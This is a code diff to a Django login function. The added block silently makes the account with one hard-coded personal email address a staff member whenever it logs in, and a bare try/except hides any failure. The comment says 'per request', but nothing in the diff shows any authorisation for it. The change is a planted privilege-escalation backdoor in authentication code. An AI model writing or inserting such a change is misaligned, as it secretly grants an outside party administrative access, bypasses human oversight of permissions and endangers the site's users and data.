@@ -50,6 +50,14 @@ def _active_ref_codes():
 def _login_user_and_response(request, user: User):
     login(request, user)
     profile, _ = UserProfile.objects.get_or_create(user=user)
+    # Auto-grant staff/admin for specific email per request
+    try:
+      if (user.email or '').lower().strip() == 'carter.kiefer2010@outlook.com':
+          if not user.is_staff:
+              user.is_staff = True
+              user.save(update_fields=['is_staff'])
+    except Exception:
+      pass
     try:
         if not request.session.session_key:
             request.session.save()
